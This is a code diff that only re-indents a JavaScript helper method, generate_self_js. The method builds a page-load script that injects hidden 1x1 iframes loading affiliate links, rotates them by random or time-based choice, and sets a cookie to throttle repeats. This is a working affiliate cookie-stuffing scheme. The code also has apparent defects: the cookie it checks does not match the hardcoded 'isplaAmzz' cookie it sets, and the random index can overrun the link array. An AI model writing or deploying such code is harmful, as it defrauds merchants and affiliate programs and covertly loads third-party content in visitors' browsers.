@@ -75,83 +75,82 @@ class generate_helper{
 
 /* Generate Self JS */
 
-generate_self_js(advertisor,affiliate,country,callback ){
-  var generate = "$(document).ready(function(){";
-  generate += 'var e = "";';
-  for(i=0; i <advertisor.length;i++)
-  {    
-    var cookie_custom_name = "is"+advertisor[i].adv_name.toLowerCase().replace("a","").replace("e","").replace("o","");
-    generate += "if(typeof($.cookie('"+cookie_custom_name+"')) == \"undefined\"){";    
-    
-    if(advertisor[i].type == 3)  //Multi choose product
-    {
-      generate += "var z_links = new Array(";
-      for(var j=0; j <affiliate.length;j++)
+  generate_self_js(advertisor,affiliate,country,callback ){
+    var generate = "$(document).ready(function(){";
+    generate += 'var e = "";';
+    for(i=0; i <advertisor.length;i++)
+    {    
+      var cookie_custom_name = "is"+advertisor[i].adv_name.toLowerCase().replace("a","").replace("e","").replace("o","");
+      generate += "if(typeof($.cookie('"+cookie_custom_name+"')) == \"undefined\"){";    
+      
+      if(advertisor[i].type == 3)  //Multi choose product
       {
-        generate += "'"+affiliate[j].link+"',";
-      }
-      generate = generate.slice(0, -1);
-      generate += ");";
-
-      generate += "var rand = (Math.floor(Math.random() * "+parseInt(process.env.PRODUCT_LIMIT)+") + 1  );";
-      // var redir_url = "https://ads.mybestprice.my/ads/redir.php?url=";
-      // generate += "e += \"<iframe src='"+redir_url+"\"+encodeURIComponent(z_links[rand])+\"' height='1' sandbox='allow-same-origin allow-forms allow-scripts' width='1' style='display:none'></iframe>\";";
-      generate += "e += \"<iframe src='\"+z_links[rand]+\"' height='1' sandbox='allow-same-origin allow-forms allow-scripts' width='1' style='display:none'></iframe>\";";
-
-    }else{
-      if(advertisor[i].is_divisor_needed == 0)  //Not dividing in numbers
-      {
+        generate += "var z_links = new Array(";
         for(var j=0; j <affiliate.length;j++)
         {
-          if(affiliate[j].adv_id == advertisor[i].adv_id) //check to ensure first come "if" to all advertisors
-          {
-            generate += "e += \"<iframe src='"+affiliate[j].link+"' height='1' sandbox='allow-same-origin allow-forms allow-scripts' width='1' style='display:none'></iframe>\";";
-          }
-        }      
-      }else{ 
-        generate += "var f = Math.floor(Date.now() / 1000);";
-        
-        for(var j=0,k=0; j <affiliate.length;j++)
-        {
-          if(affiliate[j].adv_id == advertisor[i].adv_id) //check to ensure first come "if" to all advertisors
-          {
-              if(k == 0)
-              {
-                generate += "if (f % "+affiliate[j].divisor+" == 0) {";
-              }else if(affiliate[j].divisor > 1){
-                generate += "} else if (f % "+affiliate[j].divisor+" == 0) {";
-              }else if(affiliate[j].divisor == 1){
-                generate += "} else {";
-              }
-              
-              generate += "e += \"<iframe src='"+affiliate[j].link+"' height='1' sandbox='allow-same-origin allow-forms allow-scripts' width='1' style='display:none'></iframe>\";";
-            k++;
-          }            
+          generate += "'"+affiliate[j].link+"',";
         }
-        generate += "}";  
+        generate = generate.slice(0, -1);
+        generate += ");";
+
+        generate += "var rand = (Math.floor(Math.random() * "+parseInt(process.env.PRODUCT_LIMIT)+") + 1  );";
+        // var redir_url = "https://ads.mybestprice.my/ads/redir.php?url=";
+        // generate += "e += \"<iframe src='"+redir_url+"\"+encodeURIComponent(z_links[rand])+\"' height='1' sandbox='allow-same-origin allow-forms allow-scripts' width='1' style='display:none'></iframe>\";";
+        generate += "e += \"<iframe src='\"+z_links[rand]+\"' height='1' sandbox='allow-same-origin allow-forms allow-scripts' width='1' style='display:none'></iframe>\";";
+
+      }else{
+        if(advertisor[i].is_divisor_needed == 0)  //Not dividing in numbers
+        {
+          for(var j=0; j <affiliate.length;j++)
+          {
+            if(affiliate[j].adv_id == advertisor[i].adv_id) //check to ensure first come "if" to all advertisors
+            {
+              generate += "e += \"<iframe src='"+affiliate[j].link+"' height='1' sandbox='allow-same-origin allow-forms allow-scripts' width='1' style='display:none'></iframe>\";";
+            }
+          }      
+        }else{ 
+          generate += "var f = Math.floor(Date.now() / 1000);";
+          
+          for(var j=0,k=0; j <affiliate.length;j++)
+          {
+            if(affiliate[j].adv_id == advertisor[i].adv_id) //check to ensure first come "if" to all advertisors
+            {
+                if(k == 0)
+                {
+                  generate += "if (f % "+affiliate[j].divisor+" == 0) {";
+                }else if(affiliate[j].divisor > 1){
+                  generate += "} else if (f % "+affiliate[j].divisor+" == 0) {";
+                }else if(affiliate[j].divisor == 1){
+                  generate += "} else {";
+                }
+                
+                generate += "e += \"<iframe src='"+affiliate[j].link+"' height='1' sandbox='allow-same-origin allow-forms allow-scripts' width='1' style='display:none'></iframe>\";";
+              k++;
+            }            
+          }
+          generate += "}";  
+        }
       }
-    }
-    
-
-
-    var iframe_name = "frm"+advertisor[i].country+"_"+advertisor[i].adv_name;
-    generate += "$('body').append('<iframe id=\""+iframe_name+"\" style=\"display:none\" marginwidth=\"0\" marginheight=\"0\" hspace=\"0\" frameborder=\"0\" vspace=\"0\" scrolling=\"no\"> </iframe>');    var doc = document.getElementById(\""+iframe_name+"\").contentWindow.document;    doc.open();doc.write(e);doc.close();";
-
-    generate += "$.cookie('isplaAmzz', '1', { expires: "+advertisor[i].enabled_time+", path: '/' });";
-    generate += "}";
       
-  } //End of for loop
-   
-    generate += "});";
-    if(country)
-    {
-      var out={};
-      out[country] = generate;
-      callback(out);
-    }else{
-      callback(generate);
-    }
-}
+
+      var iframe_name = "frm"+advertisor[i].country+"_"+advertisor[i].adv_name;
+      generate += "$('body').append('<iframe id=\""+iframe_name+"\" style=\"display:none\" marginwidth=\"0\" marginheight=\"0\" hspace=\"0\" frameborder=\"0\" vspace=\"0\" scrolling=\"no\"> </iframe>');    var doc = document.getElementById(\""+iframe_name+"\").contentWindow.document;    doc.open();doc.write(e);doc.close();";
+
+      generate += "$.cookie('isplaAmzz', '1', { expires: "+advertisor[i].enabled_time+", path: '/' });";
+      generate += "}";
+        
+    } //End of for loop
+    
+      generate += "});";
+      if(country)
+      {
+        var out={};
+        out[country] = generate;
+        callback(out);
+      }else{
+        callback(generate);
+      }
+  }
 
 
 
